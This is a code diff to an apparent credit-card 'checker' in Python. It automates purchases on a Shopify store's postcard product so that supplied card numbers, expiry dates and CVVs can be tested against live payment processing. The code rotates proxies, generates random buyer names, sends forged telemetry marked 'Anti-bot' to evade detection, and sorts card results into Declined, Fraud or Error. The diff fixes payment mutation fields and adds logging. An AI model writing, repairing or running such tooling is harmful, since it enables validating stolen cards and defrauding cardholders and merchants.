@@ -432,6 +432,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "FRAUD"
         elif "PROCESSING_TIMEOUT" in raw_response:
             response_display = "PROCESSING_TIMEOUT"
+        elif "PAYMENTS_PAYMENT_FLEXIBILITY" in raw_response.upper():
+            response_display = "PAYMENT_FLEXIBILITY_ERROR"
         else:
             if ":" in raw_response:
                 response_display = raw_response.split(":")[0].strip()
@@ -496,6 +498,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             status_flag = "Fraud ⚠️"
         elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
             status_flag = "Proxy Error 🚫"
+        elif "PAYMENTS_PAYMENT_FLEXIBILITY" in raw_response_upper:
+            status_flag = "Error❗️"
         else:
             status_flag = "Declined ❌"
 
@@ -543,7 +547,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     return result
 
 
-# ========== COMPLETE SUBMITFORCOMPLETION MUTATION ==========
+# ========== COMPLETE GRAPHQL MUTATIONS ==========
 SUBMIT_MUTATION = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'''
 
 POLL_MUTATION = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'''
@@ -565,7 +569,6 @@ class ShopifyKauffmanCheckout:
         self.proxy_used = False
 
         self.client = None
-        self.cookie_jar = {}
 
         # Dynamic data
         self.checkout_token = None
@@ -584,6 +587,7 @@ class ShopifyKauffmanCheckout:
         self.visit_token = None
         self.cart_token = None
         self.payment_method_identifier = None
+        self._last_responses = []
 
         self.logger = ShopifyLogger(user_id)
 
@@ -592,10 +596,10 @@ class ShopifyKauffmanCheckout:
                            "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                            "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                            "Casey", "Bruce", "Tony", "Steve", "Peter", "Clark"]
-        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
-                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
-                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
-                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang"]
+        self.last_names = ["Smith", "Jones", "Taylor", "Brown", "Williams", "Wilson", "Johnson", 
+                          "Davies", "Miller", "Davis", "Garcia", "Martinez", "Anderson", "Thomas",
+                          "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White",
+                          "Harris", "Sanchez", "Clark", "Lang"]
 
         self.first_name = random.choice(self.first_names)
         self.last_name = random.choice(self.last_names)
@@ -644,9 +648,13 @@ class ShopifyKauffmanCheckout:
     def step(self, num, name, action, details=None, status="PROCESSING"):
         return self.logger.step(num, name, action, details, status)
 
-    # ============ STEP 1: INITIALIZE SESSION / GET COOKIES ============
+    def _track_response(self, text):
+        self._last_responses.append(text[:300] if text else "")
+        if len(self._last_responses) > 3:
+            self._last_responses.pop(0)
+
+    # ============ STEP 1: INITIALIZE SESSION ============
     async def init_session(self):
-        """Step 1: Hit cart.js to get session cookies"""
         self.step(1, "INIT SESSION", "Getting session cookies from /cart.js")
         
         try:
@@ -655,8 +663,8 @@ class ShopifyKauffmanCheckout:
                 headers=self.get_headers(),
                 timeout=25
             )
+            self._track_response(resp.text if resp.status_code == 200 else "")
             
-            # Extract cookies
             self.client_id = self.client.cookies.get('_shopify_y') or str(uuid.uuid4())
             self.visit_token = self.client.cookies.get('_shopify_s') or str(uuid.uuid4())
             
@@ -672,12 +680,10 @@ class ShopifyKauffmanCheckout:
             self.logger.error_log("SESSION", str(e))
             return False
 
-    # ============ STEP 2: FIND CHEAPEST PRODUCT (DYNAMIC) ============
+    # ============ STEP 2: FIND PRODUCT ============
     async def find_product(self):
-        """Step 2: Find cheapest available product - but use hardcoded for Kauffman"""
         self.step(2, "FIND PRODUCT", "Using known product: Kauffman Center Postcard")
         
-        # Try to verify product exists
         try:
             resp = await self.client.get(
                 f"{self.base_url}/products/{self.product_handle}.json",
@@ -693,13 +699,11 @@ class ShopifyKauffmanCheckout:
                     self.logger.data_extracted("Product", f"Variant: {self.variant_id}", "Verified")
             return True
         except:
-            # Fallback to hardcoded
             self.logger.data_extracted("Product", f"Variant: {self.variant_id}", "Using hardcoded")
             return True
 
     # ============ STEP 3: ADD TO CART ============
     async def add_to_cart(self):
-        """Step 3: Add 2x postcards to cart"""
         self.step(3, "ADD TO CART", "Adding 2x Kauffman Center Postcard")
         
         headers = self.get_headers({
@@ -726,6 +730,7 @@ class ShopifyKauffmanCheckout:
                 data=data,
                 timeout=25
             )
+            self._track_response(resp.text if resp.status_code == 200 else "")
             if resp.status_code == 200:
                 j = resp.json()
                 self.cart_token = j.get('cart_token', self.cart_token)
@@ -737,9 +742,8 @@ class ShopifyKauffmanCheckout:
             self.logger.error_log("CART", str(e))
             return False
 
-    # ============ STEP 4: SEND MONORAIL/TELEMETRY EVENTS ============
+    # ============ STEP 4: TELEMETRY ============
     async def send_telemetry(self):
-        """Step 4: Send monorail produce batch events"""
         self.step(4, "TELEMETRY", "Sending monorail events")
         
         headers = self.get_headers({
@@ -755,7 +759,7 @@ class ShopifyKauffmanCheckout:
             event_id = f"sh-{str(uuid.uuid4()).upper()[:23]}"
             body = {
                 "events": [{
-                    "schema_id": f"storefront_customer_tracking/4.27",
+                    "schema_id": "storefront_customer_tracking/4.27",
                     "payload": {
                         "api_client_id": 580111,
                         "event_id": event_id,
@@ -796,9 +800,8 @@ class ShopifyKauffmanCheckout:
         self.logger.data_extracted("Telemetry", "Monorail events sent", "Anti-bot")
         return True
 
-    # ============ STEP 5: VIEW CART PAGE ============
+    # ============ STEP 5: VIEW CART ============
     async def view_cart_page(self):
-        """Step 5: View cart page to get valid session"""
         self.step(5, "VIEW CART", "Viewing cart page")
         
         headers = self.get_headers({
@@ -818,7 +821,6 @@ class ShopifyKauffmanCheckout:
 
     # ============ STEP 6: REFRESH CART ============
     async def refresh_cart(self):
-        """Step 6: Refresh cart.js to update token"""
         self.step(6, "REFRESH CART", "Refreshing cart token")
         
         headers = self.get_headers({
@@ -837,7 +839,6 @@ class ShopifyKauffmanCheckout:
 
     # ============ STEP 7: START CHECKOUT ============
     async def start_checkout(self):
-        """Step 7: Start checkout - POST to /cart to get checkout URL"""
         self.step(7, "START CHECKOUT", "Starting checkout process")
         
         headers = {
@@ -874,7 +875,6 @@ class ShopifyKauffmanCheckout:
             if match:
                 self.checkout_token = match.group(1)
                 self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "URL")
-                # Set graphql_base
                 parsed = urllib.parse.urlparse(self.checkout_url)
                 if 'shopify.com' in parsed.netloc:
                     self.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
@@ -886,9 +886,8 @@ class ShopifyKauffmanCheckout:
             self.logger.error_log("CHECKOUT_START", str(e))
             return False
 
-    # ============ STEP 8: EXTRACT TOKENS FROM CHECKOUT PAGE ============
+    # ============ STEP 8: EXTRACT TOKENS ============
     async def extract_checkout_tokens(self):
-        """Step 8: Extract ALL tokens from checkout page HTML"""
         self.step(8, "EXTRACT TOKENS", "Extracting session tokens from checkout page")
         
         headers = {
@@ -927,7 +926,7 @@ class ShopifyKauffmanCheckout:
                 self.session_token = m.group(1)
                 self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "HTML")
             
-            # Extract signature (CRITICAL for PCI)
+            # Extract signature (CRITICAL)
             m = re.search(r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"', html)
             if not m:
                 m = re.search(r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"', html)
@@ -982,13 +981,12 @@ class ShopifyKauffmanCheckout:
             self.logger.error_log("TOKEN_EXTRACT", str(e))
             return False
 
-    # ============ STEP 9: VAULT CARD (PCI) ============
+    # ============ STEP 9: VAULT CARD ============
     async def vault_card(self, cc, mes, ano, cvv):
-        """Step 9: Vault card via PCI - CRITICAL: must use real signature"""
         self.step(9, "VAULT CARD", "Vaulting card via PCI")
         
         if not self.signature:
-            self.logger.error_log("PCI", "No signature available - cannot vault card")
+            self.logger.error_log("PCI", "No signature available")
             return None
         
         card_number = cc.replace(" ", "").replace("-", "")
@@ -1009,7 +1007,7 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-storage-access': 'none',
             'user-agent': self.UA,
             'priority': 'u=1, i',
-            'shopify-identification-signature': self.signature  # CRITICAL
+            'shopify-identification-signature': self.signature
         }
         
         payload = {
@@ -1027,7 +1025,6 @@ class ShopifyKauffmanCheckout:
         }
         
         try:
-            # Send telemetry before vaulting
             await self._send_pci_telemetry("HostedFields_CardFields_vaultCard_called", "counter", 1)
             
             resp = await self.client.post(
@@ -1043,11 +1040,8 @@ class ShopifyKauffmanCheckout:
                 
                 if self.vault_id:
                     self.logger.data_extracted("Vault ID", self.vault_id[:30] + "...", "PCI")
-                    
-                    # Send telemetry after successful vault
                     await self._send_pci_telemetry("HostedFields_CardFields_form_submitted", "counter", 1)
                     await self._send_pci_telemetry("HostedFields_CardFields_deposit_time", "histogram", 325)
-                    
                     return self.vault_id
                 else:
                     self.logger.error_log("PCI", "No vault ID in response")
@@ -1066,7 +1060,6 @@ class ShopifyKauffmanCheckout:
             return None
 
     async def _send_pci_telemetry(self, metric_name, metric_type, value):
-        """Send PCI telemetry (non-critical)"""
         try:
             headers = {
                 'accept': '*/*',
@@ -1107,9 +1100,8 @@ class ShopifyKauffmanCheckout:
         except:
             pass
 
-    # ============ STEP 10: SUBMIT FOR COMPLETION ============
+    # ============ STEP 10: SUBMIT FOR COMPLETION (FIXED - NO paymentFlexibilityTermsId) ============
     async def submit_for_completion(self, cc):
-        """Step 10: SubmitForCompletion with FULL mutation"""
         self.step(10, "SUBMIT PAYMENT", "Finalizing payment via full GraphQL mutation")
         
         if not self.session_token or not self.vault_id:
@@ -1145,7 +1137,7 @@ class ShopifyKauffmanCheckout:
         _raw_cc = cc.replace(' ', '').replace('-', '')
         card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc
         
-        # CRITICAL FIELDS that were missing:
+        # FIXED: Removed paymentFlexibilityTermsId from payment section
         payload = {
             "query": SUBMIT_MUTATION,
             "operationName": "SubmitForCompletion",
@@ -1157,7 +1149,7 @@ class ShopifyKauffmanCheckout:
                     "pageId": str(uuid.uuid4()).upper()
                 },
                 "input": {
-                    "checkpointData": None,  # MISSING BEFORE - CRITICAL
+                    "checkpointData": None,
                     "sessionInput": {"sessionToken": self.session_token},
                     "queueToken": self.queue_token,
                     "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
@@ -1270,8 +1262,9 @@ class ShopifyKauffmanCheckout:
                                 "phone": self.address['phone']
                             }
                         },
-                        "creditCardBin": card_bin  # CRITICAL
+                        "creditCardBin": card_bin
                     },
+                    "poNumber": None,
                     "buyerIdentity": {
                         "customer": {
                             "presentmentCurrency": "USD",
@@ -1289,7 +1282,7 @@ class ShopifyKauffmanCheckout:
                             "countryCode": "US"
                         },
                         "rememberMe": False,
-                        "setShippingAddressAsDefault": False  # MISSING BEFORE
+                        "setShippingAddressAsDefault": False
                     },
                     "tip": {"tipLines": []},
                     "taxes": {
@@ -1301,13 +1294,13 @@ class ShopifyKauffmanCheckout:
                     },
                     "note": {
                         "message": None,
-                        "customAttributes": [  # MISSING BEFORE
+                        "customAttributes": [
                             {"key": "gorgias.guest_id", "value": self.client_id or ""},
                             {"key": "gorgias.session_id", "value": str(uuid.uuid4())}
                         ]
                     },
                     "localizationExtension": {"fields": []},
-                    "shopPayArtifact": {  # MISSING BEFORE
+                    "shopPayArtifact": {
                         "optIn": {
                             "vaultEmail": "",
                             "vaultPhone": self.address['phone'],
@@ -1323,7 +1316,7 @@ class ShopifyKauffmanCheckout:
                         "shippingScriptChanges": []
                     },
                     "optionalDuties": {"buyerRefusesDuties": False},
-                    "captcha": None,  # MISSING BEFORE
+                    "captcha": None,
                     "cartMetafields": []
                 }
             }
@@ -1334,16 +1327,20 @@ class ShopifyKauffmanCheckout:
         for attempt_num in range(max_retries):
             try:
                 resp = await self.client.post(url, json=payload, headers=headers, timeout=30)
+                self._track_response(resp.text[:300] if resp.status_code == 200 else f"Status: {resp.status_code}")
                 
                 if resp.status_code != 200:
                     if attempt_num < max_retries - 1:
                         await asyncio.sleep(1)
                         continue
+                    self.logger.error_log("SUBMIT", f"HTTP {resp.status_code}: {resp.text[:200]}")
                     return None
                 
                 res = resp.json()
                 
                 if 'errors' in res and res.get('data') is None:
+                    error_msgs = [e.get('message', '') for e in res.get('errors', [])]
+                    self.logger.error_log("SUBMIT_ERRORS", str(error_msgs)[:200])
                     if attempt_num < max_retries - 1:
                         await asyncio.sleep(1)
                         continue
@@ -1353,11 +1350,13 @@ class ShopifyKauffmanCheckout:
                 submit = data.get('submitForCompletion', {})
                 typename = submit.get('__typename', '')
                 
+                self.logger.data_extracted("Submit Response", f"Type: {typename}", f"Attempt {attempt_num + 1}")
+                
                 if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                     receipt = submit.get('receipt', {})
                     receipt_id = receipt.get('id')
                     if receipt_id:
-                        self.logger.data_extracted("Receipt ID", receipt_id.split('/')[-1], "Submit")
+                        self.logger.data_extracted("Receipt ID", receipt_id.split('/')[-1] if '/' in receipt_id else receipt_id, "Submit")
                     return receipt_id
                 
                 elif typename == 'SubmitFailed':
@@ -1368,29 +1367,34 @@ class ShopifyKauffmanCheckout:
                 elif typename == 'Throttled':
                     poll_after = submit.get('pollAfter', 1000)
                     self.queue_token = submit.get('queueToken', self.queue_token)
+                    self.logger.data_extracted("Throttled", f"Wait: {poll_after}ms", "Updating queue token")
                     await asyncio.sleep(poll_after / 1000.0)
                     payload['variables']['input']['queueToken'] = self.queue_token
                     continue
                 
                 elif typename == 'CheckpointDenied':
-                    self.logger.error_log("CHECKPOINT", "Checkpoint denied")
+                    redirect_url = submit.get('redirectUrl', '')
+                    self.logger.error_log("CHECKPOINT", f"Redirect: {redirect_url[:100]}")
                     return None
                 
                 elif typename == 'SubmitRejected':
                     errors = submit.get('errors', [])
                     codes = [e.get('code', '') for e in errors]
+                    messages = [e.get('localizedMessage', '') for e in errors]
+                    
+                    self.logger.error_log("SUBMIT_REJECTED", f"Codes: {codes}, Messages: {messages}")
                     
                     if 'WAITING_PENDING_TERMS' in codes:
-                        await asyncio.sleep(0.5)
+                        await asyncio.sleep(1)
                         continue
                     
-                    # Return the real error code
                     if codes:
                         return f"REJECTED_{codes[0]}"
                     
                     return None
                 
                 else:
+                    self.logger.error_log("UNKNOWN_RESPONSE", f"Type: {typename}")
                     if attempt_num < max_retries - 1:
                         await asyncio.sleep(1)
                         continue
@@ -1417,7 +1421,6 @@ class ShopifyKauffmanCheckout:
 
     # ============ STEP 11: POLL FOR RECEIPT ============
     async def poll_for_receipt(self, receipt_id):
-        """Step 11: Poll for receipt status with detailed query"""
         self.step(11, "POLL RECEIPT", "Polling for payment status")
         
         url = f"{self.graphql_base}/checkouts/unstable/graphql"
@@ -1456,6 +1459,7 @@ class ShopifyKauffmanCheckout:
                 }
                 
                 resp = await self.client.post(url, json=poll_payload, headers=headers, timeout=25)
+                self._track_response(resp.text[:300] if resp.status_code == 200 else f"Poll Status: {resp.status_code}")
                 
                 if resp.status_code != 200:
                     await asyncio.sleep(3)
@@ -1473,15 +1477,13 @@ class ShopifyKauffmanCheckout:
                 elif typename == 'ActionRequiredReceipt':
                     action = receipt.get('action', {})
                     action_url = action.get('url', '') or action.get('offsiteRedirect', '')
-                    if action_url:
-                        self.logger.data_extracted("3DS URL", action_url[:50] + "...", "Action required")
-                        return False, "3D_SECURE_REQUIRED"
-                    else:
+                    if not action_url and action.get('challengeData'):
                         try:
-                            cdata = json.loads(action.get('challengeData', '{}'))
+                            cdata = json.loads(action['challengeData'])
                             action_url = cdata.get('acsUrl', '') or cdata.get('url', '')
                         except:
                             pass
+                    self.logger.data_extracted("3DS Action", f"URL: {action_url[:80] if action_url else 'N/A'}", "Action required")
                     return False, "3D_SECURE_REQUIRED"
                 
                 elif typename == 'FailedReceipt':
@@ -1498,6 +1500,11 @@ class ShopifyKauffmanCheckout:
                     await asyncio.sleep(poll_delay_sec)
                     continue
                 
+                else:
+                    self.logger.error_log("UNKNOWN_POLL", f"Type: {typename}")
+                    await asyncio.sleep(3)
+                    continue
+                
             except Exception as e:
                 self.logger.error_log("POLL_ERROR", str(e))
                 await asyncio.sleep(3)
@@ -1505,9 +1512,8 @@ class ShopifyKauffmanCheckout:
         
         return False, "DECLINED - POLL_TIMEOUT"
 
-    # ============ SEND PAYMENT SUBMITTED TELEMETRY ============
+    # ============ PAYMENT TELEMETRY ============
     async def send_payment_telemetry(self):
-        """Send payment_submitted telemetry event"""
         try:
             headers = self.get_headers({
                 'content-type': 'text/plain;charset=UTF-8',
@@ -1561,7 +1567,6 @@ class ShopifyKauffmanCheckout:
 
     # ============ MAIN EXECUTION FLOW ============
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution flow"""
         try:
             # Step 0: Get proxy
             self.step(0, "GET PROXY", "Getting proxy")
@@ -1569,7 +1574,6 @@ class ShopifyKauffmanCheckout:
             if PROXY_SYSTEM_AVAILABLE:
                 self.proxy_url = get_proxy_for_user(self.user_id, "random")
                 if not self.proxy_url:
-                    self.logger.error_log("NO_PROXY", "No working proxies available")
                     self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
                 else:
                     self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30, follow_redirects=True)
@@ -1580,63 +1584,50 @@ class ShopifyKauffmanCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
             
-            # Step 1: Init session
             if not await self.init_session():
                 return False, "SESSION_INIT_FAILED"
             await asyncio.sleep(random.uniform(0.3, 0.6))
             
-            # Step 2: Find product
             if not await self.find_product():
                 return False, "PRODUCT_NOT_FOUND"
             await asyncio.sleep(random.uniform(0.3, 0.6))
             
-            # Step 3: Add to cart
             if not await self.add_to_cart():
                 return False, "ADD_TO_CART_FAILED"
             await asyncio.sleep(random.uniform(0.3, 0.6))
             
-            # Step 4: Send telemetry
             await self.send_telemetry()
             await asyncio.sleep(random.uniform(0.2, 0.4))
             
-            # Step 5: View cart
             await self.view_cart_page()
             await asyncio.sleep(random.uniform(0.3, 0.6))
             
-            # Step 6: Refresh cart
             await self.refresh_cart()
             await asyncio.sleep(random.uniform(0.2, 0.4))
             
-            # Step 7: Start checkout
             if not await self.start_checkout():
                 return False, "CHECKOUT_START_FAILED"
             await asyncio.sleep(random.uniform(0.5, 1.0))
             
-            # Step 8: Extract tokens
             if not await self.extract_checkout_tokens():
                 return False, "TOKEN_EXTRACTION_FAILED"
             await asyncio.sleep(random.uniform(0.3, 0.6))
             
-            # Step 9: Vault card
             vault_result = await self.vault_card(cc, mes, ano, cvv)
             if not vault_result:
                 return False, "CARD_VAULT_FAILED"
             await asyncio.sleep(random.uniform(0.5, 1.0))
             
-            # Step 10: Submit for completion
             submit_result = await self.submit_for_completion(cc)
             if not submit_result:
-                return False, "SUBMIT_FAILED"
+                return False, "SUBMIT_FAILED_NO_RESPONSE"
             
-            # If submit returned a rejection with error code
             if isinstance(submit_result, str) and submit_result.startswith("REJECTED_"):
                 error_code = submit_result.replace("REJECTED_", "")
                 return False, f"DECLINED - {error_code}"
             
-            # Send payment telemetry
             await self.send_payment_telemetry()
             
-            # Step 11: Poll for receipt
             success, result = await self.poll_for_receipt(submit_result)
             
             return success, result
@@ -1657,9 +1648,7 @@ class ShopifyKauffmanChecker:
         self.proxy_status = "Dead 🚫"
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method"""
         start_time = time.time()
-
         self.logger = ShopifyLogger(self.user_id)
         self.logger.start_check(card_details)
 
